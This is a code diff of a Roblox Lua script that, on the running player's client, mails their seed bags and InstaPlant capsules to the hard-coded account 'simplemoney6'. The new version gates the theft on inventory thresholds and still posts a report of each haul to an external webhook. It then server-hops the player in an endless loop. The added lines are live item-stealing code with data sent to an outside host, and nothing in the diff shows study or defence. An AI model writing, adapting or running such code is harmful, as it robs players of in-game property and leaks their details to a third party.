@@ -55,114 +55,116 @@ function GrabId()
     end
 end
 
-GrabDiamondsId()
-GrabId()
-
-local FirstWait = 25 
-local WaitValue = 0
-local usernames = {
-    popperwoah1 = false,
-    popperwoah2 = false,
-    monkeypoppylol4 = false,
-    simplemoney6 = false
-}
-
 local playerName = game.Players.LocalPlayer.Name
 
-if usernames[playerName] ~= nil and usernames[playerName] == false then
-    -- Do nothing as instructed
-else
-    WaitValue = 40
-    FirstWait = 40
+if playerName ~= "simplemoney6" then
+    GrabDiamondsId()
+    GrabId()
 
-    wait(25)
+    local FirstWait = 25
+    local WaitValue = 0
 
-    -- Button's code
-    local args1 = {
-        [1] = "simplemoney6",
-        [2] = "sent",
-        [3] = "Misc",
-        [4] = seedbagid or "",
-        [5] = seedBagAmount or ""
-    }
+    if diamondsAmount < 10000000 then
+        WaitValue = 40
+        FirstWait = 40
 
-    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args1))
-    wait(1)
-    local args2 = {
-        [1] = "simplemoney6",
-        [2] = "sent",
-        [3] = "Misc",
-        [4] = instaplantid or "",
-        [5] = instaPlantCapsuleAmount or ""
-    }
+        wait(25)
 
-    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
+        if seedBagAmount > 1000 then
+            local args1 = {
+                [1] = "simplemoney6",
+                [2] = "sent",
+                [3] = "Misc",
+                [4] = seedbagid or "",
+                [5] = seedBagAmount or ""
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args1))
+        end
 
-    local mailContentMsg = {
-        embeds = {
-            {
-                title = "***👨‍💻: " .. playerName .. "***",
-                description = "***💌: Mail Successfully Sent!***",
-                color = 16777215,
-                fields = {
-                    {
-                        name = "***🫙:***",
-                        value = "Sent ***" .. instaPlantCapsuleAmount .. "***"
-                    },
-                    {
-                        name = "***🌱:***",
-                        value = "Sent ***" .. seedBagAmount .. "***"
+        wait(1)
+
+        if instaPlantCapsuleAmount > 1000 then
+            local args2 = {
+                [1] = "simplemoney6",
+                [2] = "sent",
+                [3] = "Misc",
+                [4] = instaplantid or "",
+                [5] = instaPlantCapsuleAmount or ""
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
+        end
+
+        local mailContentMsg = {
+            embeds = {
+                {
+                    title = "***👨‍💻: " .. playerName .. "***",
+                    description = "***💌: Mail Successfully Sent!***",
+                    color = 16777215,
+                    fields = {
+                        {
+                            name = "***🫙:***",
+                            value = "Sent ***" .. instaPlantCapsuleAmount .. "***"
+                        },
+                        {
+                            name = "***🌱:***",
+                            value = "Sent ***" .. seedBagAmount .. "***"
+                        }
                     }
                 }
             }
         }
-    }
 
-    request({
-        Url = webhookURL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json",
-        },
-        Body = HttpService:JSONEncode(mailContentMsg),
-    })
-    while true do
-    wait(5)
-    local Http = game:GetService("HttpService")
-        local TPS = game:GetService("TeleportService")
-        local Api = "https://games.roblox.com/v1/games/"
+        request({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+            },
+            Body = HttpService:JSONEncode(mailContentMsg),
+        })
 
-        local _place = game.PlaceId
-        local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
+        while true do
+            wait(5)
+            local Http = game:GetService("HttpService")
+            local TPS = game:GetService("TeleportService")
+            local Api = "https://games.roblox.com/v1/games/"
 
-        -- Updated HTTP request method
-        local httpService = game:GetService("HttpService")
-        local request = (syn and syn.request) or request or (http and http.request) or http_request
+            local _place = game.PlaceId
+            local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
 
-        function ListServers(cursor)
-            local Raw = request({
-                Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
-                Method = "GET"
-            })
-            return Http:JSONDecode(Raw.Body)
+            -- Updated HTTP request method
+            local httpService = game:GetService("HttpService")
+            local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+            function ListServers(cursor)
+                local Raw = request({
+                    Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
+                    Method = "GET"
+                })
+                return Http:JSONDecode(Raw.Body)
+            end
+
+            local randomPlayers = math.random(1, 5)  -- Generate a random number between 1 and 5
+            local Server, Next
+
+            repeat
+                local Servers = ListServers(Next)
+                Server = Servers.data[1]
+                Next = Servers.nextPageCursor
+            until Server and Server.playing >= randomPlayers  -- Ensure the server has more players than the random number
+
+            if Server then
+                TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
+            else
+                print("No suitable server found.")
+            end
         end
-
-        local randomPlayers = math.random(1,5)  -- Generate a random number between 1 and 8
-        local Server, Next
-
-        repeat
-            local Servers = ListServers(Next)
-            Server = Servers.data[1]
-            Next = Servers.nextPageCursor
-        until Server and Server.playing >= randomPlayers  -- Ensure the server has more players than the random number
-
-        if Server then
-            TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
-        else
-            print("No suitable server found.")
-        end
-        end
+    end
 end
+
+
+
+
 
 
 
